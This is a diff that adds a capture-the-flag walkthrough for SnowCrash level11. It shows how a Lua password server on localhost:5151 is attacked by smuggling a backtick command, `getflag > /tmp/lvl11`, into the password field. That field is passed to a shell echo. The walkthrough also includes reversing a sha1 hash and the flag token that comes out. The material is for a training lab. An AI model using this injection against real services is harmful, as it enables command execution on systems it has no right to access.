@@ -51,3 +51,35 @@ while 1 do
   client:close()
 end
 ```
+
+It seems that level11.lua creates a server on localhost:5151 and a client that expects password. This password is later hashed with `echo`. So that is our way in. But first a little experimentation:
+```
+level11@SnowCrash:~$ nc localhost 5151
+Password: fkjhf
+Erf nope..
+
+level11@SnowCrash:~$ nc localhost 5151
+Password: f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
+Erf nope..
+```
+If we reverse sha1sum with [decoder](https://www.dcode.fr/sha1-hash) we get this line:
+*NotSoEasy*
+```
+level11@SnowCrash:~$ nc localhost 5151
+Password: NotSoEasy
+Erf nope..
+```
+But it also doesn't work.
+
+Time to exploit `echo`:
+```
+level11@SnowCrash:~$ nc localhost 5151
+Password: `getflag > /tmp/lvl11`
+Erf nope..
+
+level11@SnowCrash:~$ ls -la /tmp/lvl11
+-rw-r--r-- 1 flag11 flag11 58 Sep 21 21:18 /tmp/lvl11
+
+level11@SnowCrash:~$ cat /tmp/lvl11
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
